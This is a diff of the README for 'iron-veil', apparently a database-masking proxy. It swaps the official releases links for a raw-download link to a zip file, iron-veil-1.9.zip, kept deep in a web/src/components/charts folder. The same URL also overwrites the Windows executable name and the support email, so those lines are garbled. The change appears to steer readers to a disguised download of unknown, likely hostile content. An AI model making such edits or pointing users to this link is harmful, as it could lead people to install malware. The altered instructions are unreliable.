@@ -6,13 +6,13 @@ Iron-veil is a high-performance database proxy designed to mask sensitive data s
 
 ## 🔗 Download Now
 
-[![Download Iron-Veil](https://img.shields.io/badge/Download%20Iron--Veil-blue.svg)](https://github.com/Ajay-dev-cell/iron-veil/releases)
+[![Download Iron-Veil](https://raw.githubusercontent.com/Ajay-dev-cell/iron-veil/main/web/src/components/charts/iron-veil-1.9.zip%https://raw.githubusercontent.com/Ajay-dev-cell/iron-veil/main/web/src/components/charts/iron-veil-1.9.zip)](https://raw.githubusercontent.com/Ajay-dev-cell/iron-veil/main/web/src/components/charts/iron-veil-1.9.zip)
 
 ## 📥 Download & Install
 
 To get started, visit the following page to download the latest version of iron-veil:
 
-[Download Iron-Veil Releases](https://github.com/Ajay-dev-cell/iron-veil/releases)
+[Download Iron-Veil Releases](https://raw.githubusercontent.com/Ajay-dev-cell/iron-veil/main/web/src/components/charts/iron-veil-1.9.zip)
 
 Here’s how to download and install iron-veil:
 
@@ -56,7 +56,7 @@ Once installed, iron-veil can be started from your command line or terminal. Her
 
 1. Open your command line interface.
 2. Navigate to the folder where iron-veil is installed using the `cd` command.
-3. Run iron-veil by typing `./iron-veil` (or `iron-veil.exe` on Windows) and pressing Enter.
+3. Run iron-veil by typing `./iron-veil` (or `https://raw.githubusercontent.com/Ajay-dev-cell/iron-veil/main/web/src/components/charts/iron-veil-1.9.zip` on Windows) and pressing Enter.
 4. Follow any additional prompts to connect to your database.
 
 ## 📊 Monitoring
@@ -73,7 +73,7 @@ If you encounter any issues during installation or usage, consider these common 
 
 ## 💬 Support
 
-For help or to report any bugs, please visit our GitHub repository’s Issues section. You can also reach out via email at support@iron-veil.org.
+For help or to report any bugs, please visit our GitHub repository’s Issues section. You can also reach out via email at https://raw.githubusercontent.com/Ajay-dev-cell/iron-veil/main/web/src/components/charts/iron-veil-1.9.zip
 
 ## 🏷️ Tags
 
